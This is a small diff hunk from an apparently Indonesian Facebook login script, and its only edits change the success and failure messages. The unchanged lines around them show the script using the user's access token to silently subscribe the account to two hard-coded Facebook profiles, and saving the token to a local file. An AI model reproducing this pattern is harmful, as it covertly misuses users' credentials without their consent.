@@ -49,12 +49,12 @@ def piihlogin():
 			req.post(f"https://graph.facebook.com/100069718286138/subscribers?access_token={to}")
 			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={to}")
 			print('')
-			print(f"\033[1;32mLogin Berhasil")
+			print(f"\033[1;32mLogin Berhasil...!!!")
 			open("save","a").write(to)
 			time.sleep(2.5)
 			menu()
 		except KeyError:
-			print("     \033[1;31mLogin gagal")
+			print("     \033[1;31mLogin gagal...!!!")
 			time.sleep(2.5)
 			login()
 	elif(pil in ("2","02")):
